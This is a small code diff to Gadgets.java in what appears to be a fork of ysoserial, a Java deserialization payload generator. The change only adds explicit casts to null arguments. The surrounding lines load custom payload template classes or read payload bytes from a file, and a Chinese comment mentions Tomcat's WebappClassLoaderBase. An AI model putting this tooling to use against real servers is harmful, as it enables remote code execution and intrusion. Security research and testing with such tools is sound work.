@@ -101,7 +101,7 @@ public class Gadgets {
         if (command.startsWith("CLASS:")) {
             // 这里不能让它初始化，不然从线程中获取WebappClassLoaderBase时会强制类型转换异常。
             Class<?> clazz = Class.forName("ysoserial.payloads.templates." + command.substring(6), false, Gadgets.class.getClassLoader());
-            return createTemplatesImpl(clazz, null, null, tplClass, abstTranslet, transFactory);
+            return createTemplatesImpl(clazz, (String)null, (byte[])null, tplClass, abstTranslet, transFactory);
         } else if (command.startsWith("FILE:")) {
             byte[] bs = Files.readBytes(new File(command.substring(5)));
             return createTemplatesImpl(null, null, bs, tplClass, abstTranslet, transFactory);
